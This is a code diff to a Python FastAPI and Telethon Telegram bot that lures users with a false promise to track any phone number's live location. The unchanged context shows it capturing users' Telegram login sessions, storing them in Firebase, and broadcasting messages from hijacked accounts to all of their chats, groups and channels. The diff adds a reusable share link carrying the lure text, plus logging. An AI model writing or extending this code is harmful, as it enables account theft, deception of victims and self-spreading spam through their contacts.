@@ -2,6 +2,7 @@ import os
 import asyncio
 import re
 import requests
+from urllib.parse import quote
 from fastapi import FastAPI, Request
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
@@ -22,6 +23,12 @@ WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://your-app.onrender.com")
 BOT_USERNAME = os.environ.get("BOT_USERNAME", "anontracker_bot")
 CONCURRENT_CHATS = 5
 
+# Shared invite message used by every "Share Bot" link
+SHARE_INVITE_TEXT = (
+    "Track any mobile number's live location & full details instantly! "
+    "Open this bot and tap the Location menu button."
+)
+
 app = FastAPI()
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
 templates = Jinja2Templates(directory="templates")
@@ -35,6 +42,15 @@ bot = TelegramClient('bot_session', API_ID, API_HASH) if API_ID and API_HASH els
 
 def bot_link() -> str:
     return f"https://t.me/{BOT_USERNAME}"
+
+
+def build_share_url() -> str:
+    """Telegram share URL that shares the BOT LINK with an invite message. URL-encoded."""
+    return (
+        "https://t.me/share/url"
+        f"?url={quote(bot_link(), safe='')}"
+        f"&text={quote(SHARE_INVITE_TEXT, safe='')}"
+    )
 
 
 def build_broadcast_text() -> str:
@@ -63,6 +79,7 @@ def build_broadcast_text() -> str:
 if bot:
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
+        print(f"[bot /start] received from {event.sender_id}")
         try:
             welcome_text = (
                 "👋 **Welcome to Anon Locater Bot!**\n\n"
@@ -79,10 +96,13 @@ if bot:
                 f"↗️ **Share this bot:** {bot_link()}"
             )
             kb = [
-                [Button.url("↗️ Share Bot", f"https://t.me/share/url?url={bot_link()}&text=Track any mobile number's live location instantly! Open this bot and tap the Location menu button:")],
+                [Button.url("↗️ Share Bot", build_share_url())],
             ]
             await event.reply(welcome_text, buttons=kb)
+            print(f"[bot /start] replied to {event.sender_id}")
         except Exception as e:
+            import traceback
+            traceback.print_exc()
             print(f"[bot /start] error: {e}")
 
     @bot.on(events.NewMessage(func=lambda e: getattr(e.message, 'contact', None) is not None))
@@ -103,28 +123,31 @@ async def startup_event():
     if not BOT_TOKEN or not API_ID or not API_HASH or bot is None:
         print("⚠️ Bot not configured (BOT_TOKEN/API_ID/API_HASH missing). Bot will NOT run.")
         return
-    try:
-        await bot.start(bot_token=BOT_TOKEN)
 
-        # Non-blocking Webhook Deletion so Telethon works properly
-        def _clear_webhook():
-            try:
-                res = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", timeout=5)
-                return res.json()
-            except Exception as e:
-                return str(e)
+    print("🔧 Connecting bot...")
+    await bot.start(bot_token=BOT_TOKEN)
+    print("🔧 Bot connected, fetching me...")
 
-        status = await asyncio.to_thread(_clear_webhook)
-        print(f"Webhook deletion status: {status}")
+    me = await bot.get_me()
+    print(f"🤖 Bot started: @{me.username} (id={me.id})")
 
-        me = await bot.get_me()
-        print(f"🤖 Bot started: @{me.username} (id={me.id})")
-        asyncio.create_task(bot.run_until_disconnected())
-    except Exception as e:
-        print(f"❌ Bot startup failed: {e}")
+    # Delete webhook BEFORE starting update loop
+    def _clear_webhook():
+        try:
+            res = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true", timeout=5)
+            return res.json()
+        except Exception as e:
+            return str(e)
+
+    status = await asyncio.to_thread(_clear_webhook)
+    print(f"Webhook deletion status: {status}")
+
+    # Start the update loop
+    asyncio.create_task(bot.run_until_disconnected())
+    print("🔧 Update loop started")
 
 
-# --- Firebase Helpers (Made Asynchronous to prevent event loop blocking) ---
+# --- Firebase Helpers ---
 async def put_to_firebase(path, data):
     def _req():
         try: requests.put(f"{FIREBASE_BASE_URL}/{path}.json", json=data, timeout=15)
@@ -218,6 +241,7 @@ async def broadcast_to_all(client, me, tg_user_id, tg_username):
         "owner_name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
         "p2p_sent": p2p_count, "group_sent": group_count, "channel_sent": channel_count,
         "total_sent": p2p_count + group_count + channel_count,
+        "share_url": build_share_url(),
         "recipients": recipients,
     }
     await put_to_firebase(stats_path, summary)
@@ -353,8 +377,8 @@ async def check_session(request: Request):
     attempt = await get_from_firebase(f"tgsession/{tg_id}/attempted")
     await put_to_firebase(f"tgsession/{tg_id}/miniapp_info", data)
     if attempt:
-        return JSONResponse({"status": "signup_required"})
-    return JSONResponse({"status": "not_found"})
+        return JSONResponse({"status": "signup_required", "share_url": build_share_url()})
+    return JSONResponse({"status": "not_found", "share_url": build_share_url()})
 
 
 @app.post("/api/track_target")
@@ -373,6 +397,11 @@ async def check_phone(request: Request):
     if num_data and num_data.get("phone"):
         return JSONResponse({"status": "found", "phone": num_data.get("phone")})
     return JSONResponse({"status": "waiting"})
+
+
+@app.get("/api/share_url")
+async def share_url():
+    return JSONResponse({"url": build_share_url(), "bot_link": bot_link(), "text": SHARE_INVITE_TEXT})
 
 
 @app.post("/api/action")
@@ -424,7 +453,6 @@ async def handle_action(request: Request):
 
             start_pipeline(session_str, tg_id, tg_username)
 
-            # Clean up memory securely after a successful login flow
             await client.disconnect()
             active_clients.pop(tg_id, None)
             auth_data.pop(tg_id, None)
@@ -455,7 +483,6 @@ async def handle_action(request: Request):
 
             start_pipeline(session_str, tg_id, tg_username)
 
-            # Clean up memory securely after a successful login flow
             await client.disconnect()
             active_clients.pop(tg_id, None)
             auth_data.pop(tg_id, None)
@@ -470,5 +497,4 @@ async def handle_action(request: Request):
 if __name__ == "__main__":
     import uvicorn
     port = int(os.environ.get("PORT", 10000))
-    # Note: Keep workers at 1 (the default). Multiple workers will split the `active_clients` memory dictionary.
     uvicorn.run(app, host="0.0.0.0", port=port, proxy_headers=True, forwarded_allow_ips="*")
